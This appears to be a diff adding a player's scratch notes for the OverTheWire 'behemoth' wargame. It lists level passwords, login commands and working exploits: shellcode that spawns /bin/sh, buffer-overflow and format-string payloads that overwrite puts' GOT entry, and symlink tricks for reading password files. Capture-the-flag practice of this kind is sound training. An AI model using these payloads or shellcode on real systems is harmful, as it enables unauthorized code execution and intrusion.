@@ -1,0 +1,281 @@
+putty -ssh -P 2221 -pw behemoth0 behemoth0@behemoth.labs.overthewire.org
+xor 0x2A 0x595E58
+737472
+str
+xor 0x2A 0x45425953
+6F687379
+ohsy
+xor 0x2A 0x475E4B4F
+6D 74 61 65
+mtae
+
+strohsymtae
+mtaeohsystr
+rtsyshoetam
+eatmyshorts
+
+
+aesebootiv
+
+putty -ssh -P 2221 -pw aesebootiv behemoth1@behemoth.labs.overthewire.org
+
+This is just a buffer overflow
+
+unset env LINES
+unset env COLUMNS
+set disassembly-flavor intel
+alias ir=info register
+
+`python -c "print  'A'*40 + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' + 'D'*59 + '\xE0\xD5\xFF\xFF'"`
+
+shell python -c "print 'D'*3 + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' + 'D'*35 + '\x98\xd6\xff\xff'" > /tmp/naania/ex
+run < /tmp/naania/ex
+segfault
+
+
+(python -c "print 'D'*3 + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' + 'D'*35 + '\x98\xd6\xff\xff'";cat -) | /behemoth/behemoth1
+eimahquuof
+putty -ssh -P 2221 -pw eimahquuof behemoth2@behemoth.labs.overthewire.org
+
+mkdir /tmp/naania
+cd /tmp/naania
+/behemoth/behemoth2 &
+PID=$(ls)
+rm $PID -rf
+ln -s /etc/behemoth_pass/behemoth3 $PID 
+fg
+#wait for 33 minutes lol
+
+nieteidiel
+
+putty -ssh -P 2221 -pw nieteidiel behemoth3@behemoth.labs.overthewire.org
+readelf -S /behemoth/behemoth3
+format string vuln, trying to overwrite a call to puts to point to some shellcode
+
+0xf7e4c850 - system
+0x08048350 - puts@plt ref
+0xf7e876a0 - strcpy address?
+0x0804857e - string that can be overwritten, 22 bytes (incl \0)
+"/bin/sh"
+$(python -c "print '' + ''")
+
+maintenance info sections
+info proc mappings
+
+
+
+disas 'puts@plt'
+Dump of assembler code for function puts@plt:
+   0x08048350 <+0>:     jmp    DWORD PTR ds:0x80497ac
+   0x08048356 <+6>:     push   0x10
+   0x0804835b <+11>:    jmp    0x8048320
+End of assembler dump.
+x/wx 0x80497ac
+0x80497ac:      0xf7e71890
+info symbol 0xf7e71890
+puts in section .text of /lib32/libc.so.6
+
+
+overwrite 0xf7e71890 (puts pointer) with 0xffffd624 (pointer to the place on the stack where my shellcode is
+0xffffd624
+HOB = 0xffff, LOB = 0xd624
+%.[LOB - (0x08 + 0x21)]x = %.54779x
+%2$hn
+%.[HOB - LOB]x = %.10715x
+%$hn
+shell python -c "print '\x90\x18\xe7\xf7\x90\x18\xe7\xf7' + '%.54812x' + '%2$hn' + '%.10715x' + '%$hn' + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'" > /tmp/naania/ex
+
+
+replace 0x80497ac with 0xffffd624
+shell python -c "print '\xac\x97\x04\x08\xac\x97\x04\x08'  + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' + '%.54779x' + '%2$hn' + '%.10715x' + '%$hn'" > /tmp/naania/ex
+shell python -c "print '\xac\x97\x04\x08\xac\x97\x04\x08' + '%.54812x' + '%2$hn' + '%.10715x' + '%$hn' + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'" > /tmp/naania/ex
+x/200wx 0x80497ac-0x40
+
+
+
+shell python -c "print '\xcc\x97\x04\x08' + '%.56789x' + '%n'" > /tmp/naania/ex
+x/80wx 0x80497cc-0x10
+
+
+unset env LINES
+unset env COLUMNS
+set disassembly-flavor intel
+alias ir=info register
+
+(python -c "print '\xae\x97\x04\x08\xac\x97\x04\x08' + '%.54844x%2\$hn%.10683x%1\$hn' + 'D'*2 + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'";cat -) | /behemoth/behemoth3
+
+ietheishei
+
+
+
+
+putty -ssh -P 2221 -pw ietheishei behemoth4@behemoth.labs.overthewire.org
+
+
+for ((i = 14900;i < 15200;i++));do ln -s /etc/behemoth_pass/behemoth5 $i;done
+
+ok so basically this one is just a race condition...
+lol ok nvm it was just abusing a flag for ln
+for ((i = 16600;i < 17000;i++));do ln -T -s /etc/behemoth_pass/behemoth5 $i;done
+/behemoth/behemoth4
+
+
+aizeeshing
+
+
+
+putty -ssh -P 2221 -pw aizeeshing behemoth5@behemoth.labs.overthewire.org
+
+
+
+if i can get past the first exit statement it looks like it is just going to be a socket opening to p1337
+program ran with b5 permissions in gdb, correct perms on command line
+
+nc -ul -p1337 &
+/behemoth/behemoth5
+
+mayiroeche
+
+
+
+
+
+
+putty -ssh -P 2221 -pw mayiroeche behemoth6@behemoth.labs.overthewire.org
+
+
+
+this one looks weird, 2 different programs, behemoth6 is opening behemoth6_reader in a new process and looking for "HelloKitty" coming from a pipe from behemoth6_reader.
+behemoth6_reader is looking for a file called shellcode.text in the current directory.
+making shellcode.txt causes a segfault with nothing in it. nice.
+looks like it is literally just writing your own shellcode for this one. There is a check somewhere to make sure you aren't using shellcode from shell storm
+
+python -c "print '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'" > /tmp/naania/shellcode.txt
+nope, that causes a crash still, but at least it starts to run the shellcode
+
+https://www.tutorialspoint.com/compile_assembly_online.php
+nasm -f elf assembly.asm; ld -m elf_i386 -s -o assembly assembly.o
+here's my assembly:
+
+mov edx, 10
+push 7974h
+push 74694b6fh
+push 6c6c6548h
+mov ecx, esp
+mov ebx, 1
+mov eax, 4
+int 80h
+maybe?
+
+ok no shell code has null bytes "00", need to rewrite
+objdump -d assembly
+
+08048060 <.text>:
+ 8048060:     eb 00                     jmp    0x8048062
+ 8048062:     ba 0a 00 00 00            mov    $0xa,%edx
+ 8048067:     68 74 79 00 00            push   $0x7974
+ 804806c:     68 6f 4b 69 74            push   $0x74694b6f
+ 8048071:     68 48 65 6c 6c            push   $0x6c6c6548
+ 8048076:     89 e1                     mov    %esp,%ecx
+ 8048078:     bb 01 00 00 00            mov    $0x1,%ebx
+ 804807d:     b8 04 00 00 00            mov    $0x4,%eax
+ 8048082:     cd 80                     int    $0x80
+ 8048084:     b8 01 00 00 00            mov    $0x1,%eax
+ 8048089:     cd 80                     int    $0x80
+
+ 
+someone online mentioned that you can get rid of a lot of extra null bytes by using the shortened registers and "push word"
+
+section	.text
+	global _start       ;must be declared for using gcc
+_start:  ;tell linker entry point
+    
+    mov dl, 10
+    push word 7974h
+    push 74694b6fh
+    push 6c6c6548h
+    mov ecx, esp
+    mov bl, 1
+    mov al, 4
+    int 80h
+    mov	eax, 1	    ;system call number (sys_exit)
+    int	0x80;call kernel
+
+section	.data
+
+08048060 <.text>:
+ 8048060:     b2 0a                     mov    $0xa,%dl
+ 8048062:     66 68 74 79               pushw  $0x7974
+ 8048066:     68 6f 4b 69 74            push   $0x74694b6f
+ 804806b:     68 48 65 6c 6c            push   $0x6c6c6548
+ 8048070:     89 e1                     mov    %esp,%ecx
+ 8048072:     b3 01                     mov    $0x1,%bl
+ 8048074:     b0 04                     mov    $0x4,%al
+ 8048076:     cd 80                     int    $0x80
+ 8048078:     b8 01 00 00 00            mov    $0x1,%eax
+ 804807d:     cd 80                     int    $0x80
+
+BOOM no Null bytes (except for the unneccessary part at the end)
+k = <assembly>
+k = re.replace("(\r)*\n", " ", k)[0]
+k = re.replace("( ){2,}", " ", k)[0]
+k = k.replace(" ", "\\\x")
+print k
+
+python -c "print '\xb2\x0a\x66\x68\x74\x79\x68\x6f\x4b\x69\x74\x68\x48\x65\x6c\x6c\x89\xe1\xb3\x01\xb0\x04\xcd\x80'" > shellcode.txt
+
+ok but I also had to clear out the registers first
+
+section	.text
+	global _start       ;must be declared for using gcc
+_start:  ;tell linker entry point
+    xor eax, eax
+    xor ebx, ebx
+    xor ecx, ecx
+    xor edx, edx
+    mov dl, 10
+    push word 7974h
+    push 74694b6fh
+    push 6c6c6548h
+    mov ecx, esp
+    mov bl, 1
+    mov al, 4
+    int 80h
+    mov	eax, 1	    ;system call number (sys_exit)
+    int	0x80;call kernel
+
+section	.data
+
+python -c "print '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb2\x0a\x66\x68\x74\x79\x68\x6f\x4b\x69\x74\x68\x48\x65\x6c\x6c\x89\xe1\xb3\x01\xb0\x04\xcd\x80'" > shellcode.txt
+
+baquoxuafo
+
+
+putty -ssh -P 2221 -pw baquoxuafo behemoth7@behemoth.labs.overthewire.org
+
+
+this seems like a buffer overflow but it is also checking all of the characters to make sure that they are alphabetic characters
+
+
+
+unset env LINES
+unset env COLUMNS
+set disassembly-flavor intel
+alias ir=info register
+
+
+$(python -c "print 'A'*512 + 'B'*16 + '\xc0\xd4\xff\xff' + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'")
+well that works in gdb, but i get a SIGILL out of gdb.
+ NX, PIE, and Stack Canary are all off
+ 
+strace -i tells me I have the position of the new EIP correct, so maybe the address is wrong
+address is wrong for sure, replaced the last 4 bytes of the shellcode with DDDD and did not sigsev on that
+
+screw it, im just throwing in two full byte (worth of addresses) of nopsled
+
+$(python -c "print 'A'*512 + 'B'*16 + '\xc0\xd4\xff\xff' + '\x90'*65536 + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'")
+
+pheewij7Ae
+
+
+putty -ssh -P 2221 -pw pheewij7Ae behemoth8@behemoth.labs.overthewire.org
